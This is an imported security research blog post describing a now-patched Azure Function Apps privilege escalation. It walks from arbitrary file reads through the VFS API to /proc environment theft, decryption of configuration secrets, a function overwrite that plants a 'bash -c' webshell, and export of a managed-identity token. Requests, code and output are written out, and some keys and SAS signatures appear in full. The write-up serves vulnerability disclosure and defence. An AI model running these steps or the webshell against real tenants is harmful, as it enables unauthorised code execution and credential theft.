---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-23_escalating-privileges-with-azure-function-apps.md
original_filename: 2023-03-23_escalating-privileges-with-azure-function-apps.md
title: Escalating Privileges with Azure Function Apps
category: documents
detected_topics:
- cloud-security
- access-control
- command-injection
- automation-abuse
- api-security
- sso
tags:
- imported
- documents
- cloud-security
- access-control
- command-injection
- automation-abuse
- api-security
- sso
language: en
raw_sha256: 4b06911e1a5f5357f1e2d83f3b8cede2d7f070b290e66a5d859bc7732d99d415
text_sha256: bf91607c69ec1a16ddc5d58182e3bbc9be27a26a177d1cee30b3b50171b2056b
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: false
---

# Escalating Privileges with Azure Function Apps

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-23_escalating-privileges-with-azure-function-apps.md
- Source Type: markdown
- Detected Topics: cloud-security, access-control, command-injection, automation-abuse, api-security, sso
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: False
- Raw SHA256: `4b06911e1a5f5357f1e2d83f3b8cede2d7f070b290e66a5d859bc7732d99d415`
- Text SHA256: `bf91607c69ec1a16ddc5d58182e3bbc9be27a26a177d1cee30b3b50171b2056b`


## Content

---
title: "Escalating Privileges with Azure Function Apps"
page_title: "Escalating Privileges with Azure Function Apps | Cloud Pentesting"
url: "https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-function-apps/"
final_url: "https://www.netspi.com/blog/technical-blog/cloud-penetration-testing/azure-function-apps/"
authors: ["Karl Fosaaen (@kfosaaen)"]
programs: ["Microsoft (Azure)"]
bugs: ["Privilege escalation", "Cloud", "Container escape", "RCE"]
publication_date: "2023-03-23"
added_date: "2023-03-28"
source: "pentester.land/writeups.json"
original_index: 1343
---

[Technical](/blog/technical-blog/#post-container) / Cloud Pentesting 

# Escalating Privileges with Azure Function Apps

March 23, 2023

### [Karl Fosaaen](/authors/karl-fosaaen/)

  * [](https://www.facebook.com/sharer/sharer.php?u=https://www.netspi.com/blog/technical-blog/cloud-pentesting/azure-function-apps/)
  * [](https://twitter.com/intent/tweet?text=Escalating Privileges with Azure Function Apps&url=https://www.netspi.com/blog/technical-blog/cloud-pentesting/azure-function-apps/)
  * [](https://www.linkedin.com/shareArticle?mini=true&url=https://www.netspi.com/blog/technical-blog/cloud-pentesting/azure-function-apps/&title=Escalating Privileges with Azure Function Apps)

![Escalating Privileges with Azure Function Apps](https://www.netspi.com/wp-content/uploads/2024/03/Blog-Feature-Images-03.webp)

As penetration testers, we continue to see an increase in applications built natively in the cloud. These are a mix of legacy applications that are ported to cloud-native technologies and new applications that are freshly built in the cloud provider. One of the technologies that we see being used to support these development efforts is Azure Function Apps. We recently took a deeper look at some of the Function App functionality that resulted in a privilege escalation scenario for users with Reader role permissions on Function Apps. In the case of functions running in Linux containers, this resulted in command execution in the application containers. 

### TL;DR 

Undocumented APIs used by the Azure Function Apps Portal menu allowed for arbitrary file reads on the Function App containers. 

  * For the Windows containers, this resulted in access to ASP. Net encryption keys. 
  * For the Linux containers, this resulted in access to function master keys that allowed for overwriting Function App code and gaining remote code execution in the container. 

### What are Azure Function Apps?

As noted above, Function Apps are one of the pieces of technology used for building cloud-native applications in Azure. The service falls under the umbrella of “App Services” and has many of the common features of the parent service. At its core, the Function App service is a lightweight API service that can be used for hosting serverless application services. 

The Azure Portal allows users (with Reader or greater permissions) to view files associated with the Function App, along with the code for the application endpoints (functions). In the Azure Portal, under App files, we can see the files available at the root of the Function App. These are usually requirement files and any supporting files you want to have available for all underlying functions. 

![An example of a file available at the root of the Function App within the Azure Portal.](https://www.netspi.com/wp-content/uploads/032323_Azure-Function-App_1.png)

Under the individual functions (HttpTrigger1), we can enter the Code + Test menu to see the source code for the function. Much like the code in an Automation Account Runbook, the function code is available to anyone with Reader permissions. We do frequently find hardcoded credentials in this menu, so this is a common menu for us to work with. 

![A screenshot of the source for the function \(HttpTrigger1\).](https://www.netspi.com/wp-content/uploads/032323_Azure-Function-App_2.png)

Both file viewing options rely on an undocumented API that can be found by proxying your browser traffic while accessing the Azure Portal. The following management.azure.com API endpoint uses the VFS function to list files in the Function App:
  
  
  https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/tes
  ter/providers/Microsoft.Web/sites/vfspoc/hostruntime/admin/vfs//?rel
  ativePath=1&api-version=2021-01-15 

In the example above, $SUB_ID would be your subscription ID, and this is for the “vfspoc” Function App in the “tester” resource group.

[![Identify and fix insecure Azure configurations. Explore NetSPI’s Azure Penetration Testing solutions.](https://www.netspi.com/wp-content/uploads/Azure_CTA.webp)](https://www.netspi.com/security-testing/azure-penetration-testing)

### Discovery of the Issue

Using the identified URL, we started enumerating available files in the output:
  
  
  [
  {
  "name": "host.json",
  "size": 141,
  "mtime": "2022-08-02T19:49:04.6152186+00:00",
  "crtime": "2022-08-02T19:49:04.6092235+00:00",
  "mime": "application/json",
  "href": "https://vfspoc.azurewebsites.net/admin/vfs/host.
  json?relativePath=1&api-version=2021-01-15",
  "path": "C:homesitewwwroothost.json"
  },
  {
  "name": "HttpTrigger1",
  "size": 0,
  "mtime": "2022-08-02T19:51:52.0190425+00:00",
  "crtime": "2022-08-02T19:51:52.0190425+00:00",
  "mime": "inode/directory",
  "href": "https://vfspoc.azurewebsites.net/admin/vfs/Http
  Trigger1%2F?relativePath=1&api-version=2021-01-15",
  "path": "C:homesitewwwrootHttpTrigger1"
  }
  ]

As we can see above, this is the expected output. We can see the host.json file that is available in the Azure Portal, and the HttpTrigger1 function directory. At first glance, this may seem like nothing. While reviewing some function source code in client environments, we noticed that additional directories were being added to the Function App root directory to add libraries and supporting files for use in the functions. These files are not visible in the Portal if they’re in a directory (See “Secret Directory” below). The Portal menu doesn’t have folder handling built in, so these files seem to be invisible to anyone with the Reader role. 

![Function app files menu not showing the secret directory in the file drop down.](https://www.netspi.com/wp-content/uploads/032323_Azure-Function-App_3.png)

By using the VFS APIs, we can view all the files in these application directories, including sensitive files that the Azure Function App Contributors might have assumed were hidden from Readers. While this is a minor information disclosure, we can take the issue further by modifying the “relativePath” parameter in the URL from a “1” to a “0”. 

Changing this parameter allows us to now see the direct file system of the container. In this first case, we’re looking at a Windows Function App container. As a test harness, we’ll use a little PowerShell to grab a “management.azure.com” token from our authenticated (as a Reader) Azure PowerShell module session, and feed that to the API for our requests to read the files from the vfspoc Function App. 
  
  
  $mgmtToken = (Get-AzAccessToken -ResourceUrl 
  "https://management.azure.com").Token 
  
  (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.
  azure.com/subscriptions/$SUB_ID/resourceGroups/tester/providers/
  Microsoft.Web/sites/vfspoc/hostruntime/admin/vfs//?relativePath=
  0&api-version=2021-01-15")) -Headers @{Authorization="Bearer 
  $mgmtToken"}).Content | ConvertFrom-Json 
  
  name  : data 
  size  : 0 
  mtime  : 2022-09-12T20:20:48.2362984+00:00 
  crtime : 2022-09-12T20:20:48.2362984+00:00 
  mime  : inode/directory 
  href  : https://vfspoc.azurewebsites.net/admin/vfs/data%2F?
  relativePath=0&api-version=2021-01-15 
  path  : D:homedata 
  
  name  : LogFiles 
  size  : 0 
  mtime  : 2022-09-12T20:20:02.5561162+00:00 
  crtime : 2022-09-12T20:20:02.5561162+00:00 
  mime  : inode/directory 
  href  : https://vfspoc.azurewebsites.net/admin/vfs/LogFiles%2
  F?relativePath=0&api-version=2021-01-15 
  path  : D:homeLogFiles 
  
  name  : site 
  size  : 0 
  mtime  : 2022-09-12T20:20:02.5701081+00:00 
  crtime : 2022-09-12T20:20:02.5701081+00:00 
  mime  : inode/directory 
  href  : https://vfspoc.azurewebsites.net/admin/vfs/site%2F?
  relativePath=0&api-version=2021-01-15 
  path  : D:homesite 
  
  name  : ASP.NET 
  size  : 0 
  mtime  : 2022-09-12T20:20:48.2362984+00:00 
  crtime : 2022-09-12T20:20:48.2362984+00:00 
  mime  : inode/directory 
  href  : https://vfspoc.azurewebsites.net/admin/vfs/ASP.NET%2F
  ?relativePath=0&api-version=2021-01-15 
  path  : D:homeASP.NET

### Access to Encryption Keys on the Windows Container

With access to the container’s underlying file system, we’re now able to browse into the ASP.NET directory on the container. This directory contains the “DataProtection-Keys” subdirectory, which houses xml files with the encryption keys for the application. 

Here’s an example URL and file for those keys:
  
  
  https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/
  tester/providers/Microsoft.Web/sites/vfspoc/hostruntime/admin/vfs/
  /ASP.NET/DataProtection-Keys/key-ad12345a-e321-4a1a-d435-4a98ef4b3
  fb5.xml?relativePath=0&api-version=2018-11-01 
  
  <?xml version="1.0" encoding="utf-8"?> 
  <key id="ad12345a-e321-4a1a-d435-4a98ef4b3fb5" version="1"> 
  <creationDate>2022-03-29T11:23:34.5455524Z</creationDate> 
  <activationDate>2022-03-29T11:23:34.2303392Z</activationDate> 
  <expirationDate>2022-06-27T11:23:34.2303392Z</expirationDate> 
  <descriptor deserializerType="Microsoft.AspNetCore.DataProtection.
  AuthenticatedEncryption.ConfigurationModel.AuthenticatedEncryptor
  DescriptorDeserializer, Microsoft.AspNetCore.DataProtection, 
  Version=3.1.18.0, Culture=neutral 
  , PublicKeyToken=ace99892819abce50"> 
  <descriptor> 
  <encryption algorithm="AES_256_CBC" /> 
  <validation algorithm="HMACSHA256" /> 
  <masterKey p4_requiresEncryption="true" xmlns_p4="
  https://schemas.asp.net/2015/03/dataProtection"> 
  <!-- Warning: the key below is in an unencrypted form. --> 
  <value>a5[REDACTED]==</value> 
  </masterKey> 
  </descriptor> 
  </descriptor> 
  </key> 

While we couldn’t use these keys during the initial discovery of this issue, there is potential for these keys to be abused for decrypting information from the Function App. Additionally, we have more pressing issues to look at in the Linux container.

### Command Execution on the Linux Container

Since Function Apps can run in both Windows and Linux containers, we decided to spend a little time on the Linux side with these APIs. Using the same API URLs as before, we change them over to a Linux container function app (vfspoc2). As we see below, this same API (with “relativePath=0”) now exposes the Linux base operating system files for the container:
  
  
  https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/tester/providers/Microsoft.Web/sites/vfspoc2/hostruntime/admin/vfs//?relativePath=0&api-version=2021-01-15 
  
  JSON output parsed into a PowerShell object: 
  name  : lost+found 
  size  : 0 
  mtime  : 1970-01-01T00:00:00+00:00 
  crtime : 1970-01-01T00:00:00+00:00 
  mime  : inode/directory 
  href  : https://vfspoc2.azurewebsites.net/admin/vfs/lost%2Bfound%2F?relativePath=0&api-version=2021-01-15 
  path  : /lost+found 
  
  [Truncated] 
  
  **name  : proc 
  size  : 0 
  mtime  : 2022-09-14T22:28:57.5032138+00:00 
  crtime : 2022-09-14T22:28:57.5032138+00:00 
  mime  : inode/directory 
  href  : https://vfspoc2.azurewebsites.net/admin/vfs/proc%2F?relativePath=0 &api-version=2021-01-15 
  path  : /proc** 
  
  [Truncated] 
  
  name  : tmp 
  size  : 0 
  mtime  : 2022-09-14T22:56:33.6638983+00:00 
  crtime : 2022-09-14T22:56:33.6638983+00:00 
  mime  : inode/directory 
  href  : https://vfspoc2.azurewebsites.net/admin/vfs/tmp%2F?relativePath=0&api-version=2021-01-15 
  path  : /tmp 
  
  name  : usr 
  size  : 0 
  mtime  : 2022-09-02T21:47:36+00:00 
  crtime : 1970-01-01T00:00:00+00:00 
  mime  : inode/directory 
  href  : https://vfspoc2.azurewebsites.net/admin/vfs/usr%2F?relativePath=0&api-version=2021-01-15 
  path  : /usr 
  
  name  : var 
  size  : 0 
  mtime  : 2022-09-03T21:23:43+00:00 
  crtime : 2022-09-03T21:23:43+00:00 
  mime  : inode/directory 
  href  : https://vfspoc2.azurewebsites.net/admin/vfs/var%2F?relativePath=0&api-version=2021-01-15 
  path  : /var 

Breaking out one of my favorite NetSPI blogs, [_Directory Traversal, File Inclusion, and The Proc File System_](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/), we know that we can potentially access environmental variables for different PIDs that are listed in the “proc” directory. 

![Description of the function of the environ file in the proc file system.](https://www.netspi.com/wp-content/uploads/032323_Azure-Function-App_4.png)

If we request a listing of the proc directory, we can see that there are a handful of PIDs (denoted by the numbers) listed:
  
  
  https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/tester/providers/Microsoft.Web/sites/vfspoc2/hostruntime/admin/vfs//proc/?relativePath=0&api-version=2021-01-15 
  
  JSON output parsed into a PowerShell object: 
  name  : fs 
  size  : 0 
  mtime  : 2022-09-21T22:00:39.3885209+00:00 
  crtime : 2022-09-21T22:00:39.3885209+00:00 
  mime  : inode/directory 
  href  : https://vfspoc2.azurewebsites.net/admin/vfs/proc/fs/?relativePath=0&api-version=2021-01-15 
  path  : /proc/fs 
  
  name  : bus 
  size  : 0 
  mtime  : 2022-09-21T22:00:39.3895209+00:00 
  crtime : 2022-09-21T22:00:39.3895209+00:00 
  mime  : inode/directory 
  href  : https://vfspoc2.azurewebsites.net/admin/vfs/proc/bus/?relativePath=0&api-version=2021-01-15 
  path  : /proc/bus 
  
  [Truncated] 
  
  name  : 1 
  size  : 0 
  mtime  : 2022-09-21T22:00:38.2025209+00:00 
  crtime : 2022-09-21T22:00:38.2025209+00:00 
  mime  : inode/directory 
  href  : https://vfspoc2.azurewebsites.net/admin/vfs/proc/1/?relativePath=0&api-version=2021-01-15 
  path  : /proc/1 
  
  name  : 16 
  size  : 0 
  mtime  : 2022-09-21T22:00:38.2025209+00:00 
  crtime : 2022-09-21T22:00:38.2025209+00:00 
  mime  : inode/directory 
  href  : https://vfspoc2.azurewebsites.net/admin/vfs/proc/16/?relativePath=0&api-version=2021-01-15 
  path  : /proc/16 
  
  [Truncated] 
  
  **name  : 59 
  size  : 0 
  mtime  : 2022-09-21T22:00:38.6785209+00:00 
  crtime : 2022-09-21T22:00:38.6785209+00:00 
  mime  : inode/directory 
  href  : https://vfspoc2.azurewebsites.net/admin/vfs/proc/59/?relativePath=0 &api-version=2021-01-15 
  path  : /proc/59 **
  
  name  : 1113 
  size  : 0 
  mtime  : 2022-09-21T22:16:09.1248576+00:00 
  crtime : 2022-09-21T22:16:09.1248576+00:00 
  mime  : inode/directory 
  href  : https://vfspoc2.azurewebsites.net/admin/vfs/proc/1113/?relativePath=0&api-version=2021-01-15 
  path  : /proc/1113 
  
  name  : 1188 
  size  : 0 
  mtime  : 2022-09-21T22:17:18.5695703+00:00 
  crtime : 2022-09-21T22:17:18.5695703+00:00 
  mime  : inode/directory 
  href  : https://vfspoc2.azurewebsites.net/admin/vfs/proc/1188/?relativePath=0&api-version=2021-01-15 
  path  : /proc/1188

For the next step, we can use PowerShell to request the “environ” file from PID 59 to get the environmental variables for that PID. We will then write it to a temp file and “get-content” the file to output it.
  
  
  $mgmtToken = (Get-AzAccessToken -ResourceUrl "https://management.azure.com").Token 
  
  Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/tester/providers/Microsoft.Web/sites/vfspoc2/hostruntime/admin/vfs//proc/59/environ?relativePath=0&api-version=2021-01-15")) -Headers @{Authorization="Bearer $mgmtToken"} -OutFile .TempFile.txt 
  
  gc .TempFile.txt 
  
  PowerShell Output - Newlines added for clarity: 
  CONTAINER_IMAGE_URL=mcr.microsoft.com/azure-functions/mesh:3.13.1-python3.7 
  REGION_NAME=Central US  
  HOSTNAME=SandboxHost-637993944271867487  
  [Truncated] 
  **CONTAINER_ENCRYPTION_KEY** =bgyDt7gk8COpwMWMxClB7Q1+CFY/a15+mCev2leTFeg=  
  LANG=C.UTF-8  
  CONTAINER_NAME=E9911CE2-637993944227393451 
  [Truncated]
  **CONTAINER_START_CONTEXT_SAS_URI** =https://wawsstorageproddm1157.blob.core.windows.net/azcontainers/e9911ce2-637993944227393451?sv=2014-02-14&sr=b&sig=5ce7MUXsF4h%2Fr1%2BfwIbEJn6RMf2%2B06c2AwrNSrnmUCU%3D&st=2022-09-21T21%3A55%3A22Z&se=2023-09-21T22%3A00%3A22Z&sp=r
  [Truncated]

In the output, we can see that there are a couple of interesting variables. 

  * CONTAINER_ENCRYPTION_KEY 
  * CONTAINER_START_CONTEXT_SAS_URI 

The encryption key variable is self-explanatory, and the SAS URI should be familiar to anyone that read Jake Karnes’ post on attacking [Azure SAS tokens](https://www.netspi.com/blog/technical/web-application-penetration-testing/azure-sas-tokens/). If we navigate to the SAS token URL, we’re greeted with an “encryptedContext” JSON blob. Conveniently, we have the encryption key used for this data. 

![A screenshot of an "encryptedContext" JSON blob with the encryption key.](https://www.netspi.com/wp-content/uploads/032323_Azure-Function-App_5.png)

Using CyberChef, we can quickly pull together the pieces to decrypt the data. In this case, the IV is the first portion of the JSON blob (“Bad/iquhIPbJJc4n8wcvMg==”). We know the key (“bgyDt7gk8COpwMWMxClB7Q1+CFY/a15+mCev2leTFeg=”), so we will just use the middle portion of the Base64 JSON blob as our input. 

Here’s what the recipe looks like in CyberChef: 

![An example of using CyberChef to decrypt data from a JSON blob.](https://www.netspi.com/wp-content/uploads/032323_Azure-Function-App_6.png)

Once decrypted, we have another JSON blob of data, now with only one encrypted chunk (“EncryptedEnvironment”). We won’t be dealing with that data as the important information has already been decrypted below. 
  
  
  {"SiteId":98173790,"SiteName":"vfspoc2", 
  "EncryptedEnvironment":"2 | Xj[REDACTED]== | XjAN7[REDACTED]KRz", 
  "Environment":{"FUNCTIONS_EXTENSION_VERSION":"~3", 
  "APPSETTING_FUNCTIONS_EXTENSION_VERSION":"~3", 
  "FUNCTIONS_WORKER_RUNTIME":"python", 
  "APPSETTING_FUNCTIONS_WORKER_RUNTIME":"python", 
  "AzureWebJobsStorage":"DefaultEndpointsProtocol=https;AccountName=
  storageaccountfunct9626;AccountKey=7s[REDACTED]uA==;EndpointSuffix=
  core.windows.net", 
  "APPSETTING_AzureWebJobsStorage":"DefaultEndpointsProtocol=https;
  AccountName=storageaccountfunct9626;AccountKey=7s[REDACTED]uA==;
  EndpointSuffix=core.windows.net", 
  "ScmType":"None", 
  "APPSETTING_ScmType":"None", 
  "WEBSITE_SITE_NAME":"vfspoc2", 
  "APPSETTING_WEBSITE_SITE_NAME":"vfspoc2", 
  "WEBSITE_SLOT_NAME":"Production", 
  "APPSETTING_WEBSITE_SLOT_NAME":"Production", 
  "SCM_RUN_FROM_PACKAGE":"https://storageaccountfunct9626.blob.core.
  windows.net/scm-releases/scm-latest-vfspoc2.zip?sv=2014-02-14&sr=b&
  sig=%2BN[REDACTED]%3D&se=2030-03-04T17%3A16%3A47Z&sp=rw", 
  "APPSETTING_SCM_RUN_FROM_PACKAGE":"https://storageaccountfunct9626.
  blob.core.windows.net/scm-releases/scm-latest-vfspoc2.zip?sv=2014-
  02-14&sr=b&sig=%2BN[REDACTED]%3D&se=2030-03-04T17%3A16%3A47Z&sp=rw", 
  "WEBSITE_AUTH_ENCRYPTION_KEY":"F1[REDACTED]25", 
  "AzureWebEncryptionKey":"F1[REDACTED]25", 
  "WEBSITE_AUTH_SIGNING_KEY":"AF[REDACTED]DA", 
  [Truncated] 
  "FunctionAppScaleLimit":0,"CorsSpecializationPayload":{"Allowed
  Origins":["https://functions.azure.com", 
  "https://functions-staging.azure.com", 
  "https://functions-next.azure.com"],"SupportCredentials":false},
  "EasyAuthSpecializationPayload":{"SiteAuthEnabled":true,"SiteAuth
  ClientId":"18[REDACTED]43", 
  "SiteAuthAutoProvisioned":true,"SiteAuthSettingsV2Json":null}, 
  "Secrets":{"Host":{"Master":"Q[REDACTED]=","Function":{"default":
  "k[REDACTED]="}, 
  "System":{}},"Function":[]}} 

The important things to highlight here are: 

  * AzureWebJobsStorage and APPSETTING_AzureWebJobsStorage 
  * SCM_RUN_FROM_PACKAGE and APPSETTING_SCM_RUN_FROM_PACKAGE 
  * Function App “Master” and “Default” secrets 

It should be noted that the “MICROSOFT_PROVIDER_AUTHENTICATION_SECRET” will also be available if the Function App has been set up to authenticate users via Azure AD. This is an App Registration credential that might be useful for gaining access to the tenant. 

While the jobs storage information is a nice way to get access to the Function App Storage Account, we will be more interested in the Function “Master” App Secret, as that can be used to overwrite the functions in the app. By overwriting the functions, we can get full command execution in the container. This would also allow us to gain access to any attached Managed Identities on the Function App. 

For our Proof of Concept, we’ll use the baseline PowerShell “hello” function as our template to overwrite: 

![A screenshot of the PowerShell "hello" function.](https://www.netspi.com/wp-content/uploads/032323_Azure-Function-App_7.png)

This basic function just returns the “Name” submitted from a request parameter. For our purposes, we’ll convert this over to a Function App webshell (of sorts) that uses the “Name” parameter as the command to run.
  
  
  using namespace System.Net 
  
  # Input bindings are passed in via param block. 
  param($Request, $TriggerMetadata) 
  
  # Write to the Azure Functions log stream. 
  Write-Host "PowerShell HTTP trigger function 
  processed a request." 
  
  # Interact with query parameters or the body of the request. 
  $name = $Request.Query.Name 
  if (-not $name) { 
  $name = $Request.Body.Name 
  } 
  
  $body = "This HTTP triggered function executed successfully. 
  Pass a name in the query string or in the request body for a 
  personalized response." 
  
  if ($name) { 
  $cmdoutput = [string](bash -c $name) 
  $body = (-join("Executed Command: ",$name,"`nCommand Output: 
  ",$cmdoutput)) 
  } 
  
  # Associate values to output bindings by calling 'Push-OutputBinding'. 
  Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{ 
  StatusCode = [HttpStatusCode]::OK 
  Body = $body 
  }) 

To overwrite the function, we will use BurpSuite to send a PUT request with our new code. Before we do that, we need to make an initial request for the function code to get the associated ETag to use with PUT request.

**Initial GET of the Function Code:**
  
  
  GET /admin/vfs/home/site/wwwroot/HttpTrigger1/run.
  ps1 HTTP/1.1 
  Host: vfspoc2.azurewebsites.net 
  x-functions-key: Q[REDACTED]= 
  
  HTTP/1.1 200 OK 
  Content-Type: application/octet-stream 
  Date: Wed, 21 Sep 2022 23:29:01 GMT 
  Server: Kestrel 
  ETag: "38aaebfb279cda08" 
  Last-Modified: Wed, 21 Sep 2022 23:21:17 GMT 
  Content-Length: 852 
  
  using namespace System.Net 
  
  # Input bindings are passed in via param block. 
  param($Request, $TriggerMetadata) 
  [Truncated] 
  }) 

**PUT Overwrite Request Using the Tag as the “If-Match” Header:**
  
  
  PUT /admin/vfs/home/site/wwwroot/HttpTrigger1/
  run.ps1 HTTP/1.1 
  Host: vfspoc2.azurewebsites.net 
  x-functions-key: Q[REDACTED]= 
  Content-Length: 851 
  If-Match: "38aaebfb279cda08" 
  
  using namespace System.Net 
  
  # Input bindings are passed in via param block. 
  param($Request, $TriggerMetadata) 
  
  # Write to the Azure Functions log stream. 
  Write-Host "PowerShell HTTP trigger function processed 
  a request." 
  
  # Interact with query parameters or the body of the request. 
  $name = $Request.Query.Name 
  if (-not $name) { 
  $name = $Request.Body.Name 
  } 
  
  $body = "This HTTP triggered function executed successfully. 
  Pass a name in the query string or in the request body for a 
  personalized response." 
  
  if ($name) { 
  $cmdoutput = [string](bash -c $name) 
  $body = (-join("Executed Command: ",$name,"`nCommand Output: 
  ",$cmdoutput)) 
  } 
  
  # Associate values to output bindings by calling 
  'Push-OutputBinding'. 
  Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{ 
  StatusCode = [HttpStatusCode]::OK 
  Body = $body 
  }) 
  
  
  HTTP Response: 
  
  HTTP/1.1 204 No Content 
  Date: Wed, 21 Sep 2022 23:32:32 GMT 
  Server: Kestrel 
  ETag: "c243578e299cda08" 
  Last-Modified: Wed, 21 Sep 2022 23:32:32 GMT

The server should respond with a 204 No Content, and an updated ETag for the file. With our newly updated function, we can start executing commands. 

**Sample URL:**
  
  
  https://vfspoc2.azurewebsites.net/api/HttpTrigger1?name=
  whoami&code=Q[REDACTED]= 

**Browser Output:**

![Browser output for the command "whoami."](https://www.netspi.com/wp-content/uploads/032323_Azure-Function-App_8.png)

Now that we have full control over the Function App container, we can potentially make use of any attached Managed Identities and generate tokens for them. In our case, we will just add the following PowerShell code to the function to set the output to the management token we’re trying to export. 
  
  
  $resourceURI = "https://management.azure.com" 
  $tokenAuthURI = $env:IDENTITY_ENDPOINT + "?resource=
  $resourceURI&api-version=2019-08-01" 
  $tokenResponse = Invoke-RestMethod -Method Get 
  -Headers @{"X-IDENTITY-HEADER"="$env:IDENTITY_HEADER"} 
  -Uri $tokenAuthURI 
  $body = $tokenResponse.access_token

**Example Token Exported from the Browser:**

![Example token exported from the browser.](https://www.netspi.com/wp-content/uploads/032323_Azure-Function-App_9.png)

For more information on taking over Azure Function Apps, check out this fantastic post by Bill Ben Haim and Zur Ulianitzky: [_10 ways of gaining control over Azure function Apps_](https://medium.com/xm-cyber/10-ways-of-gaining-control-over-azure-function-apps-7e7b84367ce6). 

### Conclusion 

Let’s recap the issue: 

  1. Start as a user with the Reader role on a Function App. 

  2. Abuse the undocumented VFS API to read arbitrary files from the containers.

  3. Access encryption keys on the Windows containers or access the “proc” files from the Linux Container.

  4. Using the Linux container, read the process environmental variables. 

  5. Use the variables to access configuration information in a SAS token URL. 

  6. Decrypt the configuration information with the variables. 

  7. Use the keys exposed in the configuration information to overwrite the function and gain command execution in the Linux Container. 

All this being said, we submitted this issue through MSRC, and they were able to remediate the file access issues. The APIs are still there, so you may be able to get access to some of the Function App container and application files with the appropriate role, but the APIs are now restricted for the Reader role. 

### MSRC timeline

The initial disclosure for this issue, focusing on Windows containers, was sent to MSRC on Aug 2, 2022. A month later, we discovered the additional impact related to the Linux containers and submitted a secondary ticket, as the impact was significantly higher than initially discovered and the different base container might require a different remediation. 

There were a few false starts on the remediation date, but eventually the vulnerable API was restricted for the Reader role on January 17, 2023. On January 24, 2023, Microsoft rolled back the fix after it caused some issues for customers. 

On March 6, 2023, Microsoft reimplemented the fix to address the issue. The rollout was completed globally on March 8. At the time of publishing, the Reader role no longer has the ability to read files with the Function App VFS APIs. It should be noted that the Linux escalation path is still a viable option if an attacker has command execution on a Linux Function App. 

## Explore More Blog Posts

[ ![](https://www.netspi.com/wp-content/uploads/2024/07/072924_TECH_GCPwn_Feature.webp) Cloud Pentesting Bypassing Microsoft Entra Conditional Access Policies via Nested App Authentication  June 22, 2026 Discover how attackers bypassed Microsoft Entra Conditional Access Policies using Nested App Authentication (NAA) flows in this technical vulnerability breakdown. Learn More ](https://www.netspi.com/blog/technical-blog/cloud-pentesting/bypassing-microsoft-entra-conditional-access-policies-via-nested-app-authentication/)[ ![](https://www.netspi.com/wp-content/uploads/2026/06/Feature-Image_Red-Plaid.jpg) Social Engineering I’m Just Asking Questions: Social Engineering as a Reporter  June 17, 2026 Dive into this real-world social engineering assessment where a fake anonymous tip and an adversary-in-the-middle framework tested the limits of an organization's security policies. Learn More ](https://www.netspi.com/blog/technical-blog/social-engineering/im-just-asking-questions-social-engineering-as-a-reporter/)[ ![](https://www.netspi.com/wp-content/uploads/2025/12/TB-Design-6_Feature-Image.png) CISO Perspectives Beyond the Hype: What Regulated Industries Need to Know Before Trusting AI Security Tooling  June 16, 2026 AI security tools can build an attack, but enterprise security teams in regulated industries need consistency, auditability, and predictable costs before they can trust one. Learn why the surrounding infrastructure is where most AI security vendors are still falling short. Learn More ](https://www.netspi.com/blog/executive-blog/ciso-perspectives/beyond-the-hype-what-regulated-industries-need-to-know-before-trusting-ai-security-tooling/)
